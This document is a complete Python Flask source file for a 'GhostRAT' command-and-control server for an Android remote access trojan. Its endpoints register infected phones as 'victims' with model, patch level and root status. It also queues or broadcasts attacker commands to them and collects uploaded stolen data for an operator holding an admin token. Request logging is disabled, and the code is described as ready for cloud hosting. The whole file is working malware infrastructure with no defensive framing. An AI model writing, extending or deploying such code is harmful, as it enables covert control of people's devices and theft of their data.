#!/usr/bin/env python3
"""
GhostRAT C2 Server — COMPLETE (Render Compatible)
"""
import os
import json
import hashlib
import secrets
import time
from flask import Flask, request, jsonify
from datetime import datetime
import logging

app = Flask(__name__)

# Disable Flask logs
log = logging.getLogger('werkzeug')
log.disabled = True

# In-memory storage
victims = {}
commands = {}
data_store = {}

# Admin token
ADMIN_TOKEN = os.environ.get('ADMIN_TOKEN', secrets.token_hex(32))

# ============ VICTIM ENDPOINTS ============

@app.route('/')
def home():
    return jsonify({'status': 'GhostRAT C2 Active', 'victims': len(victims)})

@app.route('/victim/register', methods=['POST'])
def victim_register():
    try:
        data = request.get_json()
        device_id = data.get('device_id', 'unknown')
        model = data.get('model', 'Unknown')
        android = data.get('android', 'Unknown')
        manufacturer = data.get('manufacturer', 'Unknown')
        fingerprint = data.get('fingerprint', '')
        security_patch = data.get('security_patch', '')
        rooted = data.get('rooted', '0')

        # Generate unique victim ID
        victim_id = hashlib.sha256(
            (device_id + str(time.time())).encode()
        ).hexdigest()[:16]

        victims[victim_id] = {
            'device_id': device_id,
            'model': model,
            'android': android,
            'manufacturer': manufacturer,
            'fingerprint': fingerprint,
            'security_patch': security_patch,
            'rooted': rooted,
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'online': True
        }
        commands[victim_id] = []
        data_store[victim_id] = []

        print(f"[+] New Victim: {victim_id} - {model} (Android {android})")
        return jsonify({'status': 'registered', 'victim_id': victim_id, 'check_interval': 20})
    except Exception as e:
        print(f"[-] Register error: {e}")
        return jsonify({'status': 'error'}), 400


@app.route('/victim/checkin', methods=['POST'])
def victim_checkin():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')

        if not victim_id or victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404

        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        victims[victim_id]['online'] = True

        pending = commands.get(victim_id, [])
        commands[victim_id] = []

        return jsonify({'status': 'ok', 'commands': pending})
    except Exception as e:
        print(f"[-] Checkin error: {e}")
        return jsonify({'status': 'error'}), 400


@app.route('/victim/poll', methods=['POST'])
def victim_poll():
    """Alias for checkin - some clients use /poll"""
    return victim_checkin()


@app.route('/victim/upload', methods=['POST'])
def victim_upload():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        device_id = data.get('device_id', '')
        payload = data.get('data', '')
        data_type = data.get('type', 'unknown')

        # Support both victim_id and device_id
        if not victim_id and device_id:
            # Find victim by device_id
            for vid, info in victims.items():
                if info.get('device_id') == device_id:
                    victim_id = vid
                    break

        if not victim_id or victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404

        data_store[victim_id].append({
            'type': data_type,
            'data': payload,
            'time': datetime.now().isoformat()
        })

        # Keep only last 200 entries
        if len(data_store[victim_id]) > 200:
            data_store[victim_id] = data_store[victim_id][-200:]

        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        return jsonify({'status': 'stored'})
    except Exception as e:
        print(f"[-] Upload error: {e}")
        return jsonify({'status': 'error'}), 400


# ============ ADMIN ENDPOINTS ============

def verify_admin(req):
    token = req.headers.get("X-Admin-Token", "")
    if not token:
        # Also check query param
        token = req.args.get("token", "")
    return token == ADMIN_TOKEN


@app.route('/admin/victims', methods=['GET'])
def admin_get_victims():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403

    result = []
    for vid, info in victims.items():
        # Mark offline if not seen in 2 minutes
        try:
            last_seen = datetime.fromisoformat(info['last_seen'])
            online = (datetime.now() - last_seen).seconds < 120
            info['online'] = online
        except:
            online = False

        result.append({
            'victim_id': vid,
            'model': info.get('model', 'Unknown'),
            'android': info.get('android', 'Unknown'),
            'manufacturer': info.get('manufacturer', 'Unknown'),
            'online': online,
            'last_seen': info.get('last_seen', ''),
            'pending_data': len(data_store.get(vid, [])),
            'rooted': info.get('rooted', '0')
        })

    return jsonify({'victims': result, 'total': len(result)})


@app.route('/admin/send_command', methods=['POST'])
def admin_send_command():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403

    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        command = data.get('command', '')
        cmd_type = data.get('type', 'raw')

        if not victim_id or victim_id not in victims:
            return jsonify({'error': 'Victim not found'}), 404

        commands[victim_id].append({
            'type': cmd_type,
            'command': command,
            'time': datetime.now().isoformat()
        })

        print(f"[>] Command sent to {victim_id}: {cmd_type}/{command}")
        return jsonify({'status': 'queued', 'victim_id': victim_id})
    except Exception as e:
        print(f"[-] Send command error: {e}")
        return jsonify({'status': 'error'}), 400


@app.route('/admin/get_data', methods=['POST'])
def admin_get_data():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403

    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')

        if not victim_id or victim_id not in victims:
            return jsonify({'error': 'Victim not found'}), 404

        pending = data_store.get(victim_id, [])
        data_store[victim_id] = []

        return jsonify({
            'victim_id': victim_id,
            'data_count': len(pending),
            'data': pending
        })
    except Exception as e:
        print(f"[-] Get data error: {e}")
        return jsonify({'status': 'error'}), 400


@app.route('/admin/broadcast', methods=['POST'])
def admin_broadcast():
    """Send command to ALL victims"""
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403

    try:
        data = request.get_json()
        command = data.get('command', '')
        cmd_type = data.get('type', 'raw')

        count = 0
        for vid in victims:
            commands[vid].append({
                'type': cmd_type,
                'command': command,
                'time': datetime.now().isoformat()
            })
            count += 1

        return jsonify({'status': 'broadcast', 'sent_to': count})
    except Exception as e:
        return jsonify({'status': 'error'}), 400


# ============ HEALTH ============

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({'status': 'alive', 'victims': len(victims), 'uptime': str(datetime.now())})


# ============ MAIN ============
if __name__ == '__main__':
    print("=" * 50)
    print("  👻 GhostRAT C2 Server")
    print("=" * 50)
    print(f"  Admin Token: {ADMIN_TOKEN}")
    print(f"  SAVE THIS TOKEN!")
    print("=" * 50)

    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
